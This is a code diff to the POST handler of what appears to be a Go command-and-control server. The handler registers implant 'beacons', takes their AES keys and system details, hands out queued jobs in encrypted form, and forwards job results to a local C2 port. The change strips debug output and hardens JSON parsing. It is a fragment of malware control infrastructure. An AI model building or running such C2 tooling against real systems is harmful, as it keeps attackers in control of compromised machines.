@@ -54,12 +54,8 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 	ip, _, _ := net.SplitHostPort(r.RemoteAddr)
 	domain := r.Host
 
-	println("1")
-
 	for i, beacon := range listener.Beacons {
 		if beacon.Ip == ip && beacon.AESkey == "" && beacon.Arch == "" {
-
-			println("2")
 
 			var CusAes big.Int
 			CusAes.SetBytes(ReverseBytes(GetBytes(body, 16)))
@@ -89,7 +85,7 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 			listener.Beacons[i].Arch = mtdt["arch"]
 			listener.Beacons[i].System = mtdt["wver"]
 
-			println("saving xml")
+			println("Saving Xml File :)")
 			ModifyBeacons("./Listener/"+listener.Lisname, listener.Beacons)
 
 			return res, true
@@ -105,9 +101,6 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 					return res, true // sleep
 				} else {
 					res = append(res, make_fucker(listener, i)...)
-
-					printkey(res)
-
 					res = eAES.EncryptData(res)
 					return res, true
 				}
@@ -116,26 +109,30 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 				if !err {
 					println("not de ")
 				}
-				println(string(json_byte))
 				remove_job(listener, i)
 
 				var jsonObj map[string]interface{}
-				json.Unmarshal(json_byte, &jsonObj)
+
+				json_byte = []byte(strings.Replace(string(json_byte), "\n", "\\n", -1))
+				json_byte = []byte(strings.Replace(string(json_byte), "\t", "\\t", -1))
+
+				er := json.Unmarshal(json_byte, &jsonObj)
+				if er != nil {
+					fmt.Println("Error unmarshalling JSON:", er)
+				}
+
 				jsonObj["c2"] = strconv.Itoa(i)
 				newJsonStr, _ := json.Marshal(jsonObj)
 				json_byte = append(newJsonStr)
 
 				println(string(json_byte))
 
-				Send_Bytes_to(w, json_byte, "http://localhost:50049/c2", expectedHeaders)
+				Send_Bytes_to(w, json_byte, "http://localhost:"+strconv.Itoa(int(CONFIG.C2port-1))+"/c2", expectedHeaders)
 
 				if is_jobs_null(listener, i) {
 					return res, true // sleep
 				} else {
 					res = append(res, make_fucker(listener, i)...)
-
-					printkey(res)
-
 					res = eAES.EncryptData(res)
 					return res, true
 				}
